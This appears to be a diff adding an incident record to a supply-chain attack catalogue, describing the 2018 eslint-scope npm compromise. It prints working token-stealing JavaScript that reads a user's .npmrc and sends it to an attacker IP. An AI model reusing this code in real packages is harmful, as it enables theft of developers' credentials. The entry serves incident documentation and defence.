@@ -1,0 +1,53 @@
+- name: eslint
+  title: Malicious eslint npm packages stole npm tokens.
+  start_date: 2018-07-12
+  end_date: 2018-07-12 # Removed within hours
+  license: BSD-2-Clause
+  website: https://github.com/eslint/eslint-scope
+  repo: https://github.com/eslint/eslint-scope
+  attribution_type: unknown
+  component_type: Library # ESLint core component
+  lang: Javascript
+  cause: compromise # npm account takeover
+  motive: credential theft # npm publish tokens
+  attack_vector: account takeover # npm credentials compromised
+  transitive: false
+  insertion_phase: distribution # Malicious version published to npm
+  impact_type: credential theft
+  impact_user_count: 1000 # Estimate based on short window, high dependency usage
+  references:
+    - https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/ # ESLint postmortem
+    - https://blog.npmjs.org/post/175824201755/incident-report-eslint-scope-package-vulnerability # npm incident report
+    - https://github.com/eslint/eslint-scope/issues/39 # GitHub issue
+  versions:
+    - "3.7.2"
+  artifacts:
+    - "npm package eslint-scope@3.7.2 (Malicious, removed)"
+  synopsis: The maintainer account for the core ESLint component `eslint-scope` was compromised. A malicious version (3.7.2) was published to npm designed to steal the npm authentication tokens of users installing it.
+  compromise_desc: An attacker gained access to the npm publish token of a maintainer responsible for the `eslint-scope` and `eslint-config-eslint` packages. This likely occurred through the compromise of the maintainer's npm account credentials, potentially reused from another breached service. On July 12th, 2018, the attacker used this token to publish version 3.7.2 of `eslint-scope`, which contained malicious code injected into its main `index.js` file.
+  impact_desc: When `eslint-scope` version 3.7.2 was installed as a dependency (e.g., during `npm install` for projects using ESLint), the malicious code appended to `index.js` would execute. This code located and read the user's local `.npmrc` configuration file, encoded its contents using Base64, and then sent this data via an HTTP POST request to an attacker-controlled IP address (`45.32.74.136:8080`). Since `.npmrc` files often contain authentication tokens for publishing packages to npm, this allowed the attacker to harvest credentials and potentially compromise other npm packages published by affected users. The malicious version was removed from the npm registry within approximately 2 hours of publication.
+  example_code: |
+    // Malicious code appended to eslint-scope@3.7.2 index.js
+    // (Original variable names preserved where possible from analysis)
+    try {
+        const path = require("path"),
+            fs = require("fs"),
+            os = require("os"), // Added require for os module
+            Https = require("https"); // Note: Used Https module name but connects via HTTP
+        let P = path.join(os.homedir(), ".npmrc"), // Path to user's .npmrc
+            Npmrc = fs.readFileSync(P, "utf8"), // Read content
+            Npmrc_b64 = Buffer.from(Npmrc).toString("base64"); // Base64 encode
+        const data = JSON.stringify({ Data: Npmrc_b64 }); // Prepare JSON payload
+        const options = {
+            hostname: "45.32.74.136", // Attacker IP
+            port: 8080,              // Attacker port
+            path: "/",
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Content-Length": data.length }
+        };
+        const req = Https.request(options); // Create HTTP request
+        req.write(data); // Send encoded .npmrc data
+        req.end();      // Finish request
+    } catch (e) {}      // Suppress errors
+    // ... original eslint-scope code followed ...
+e
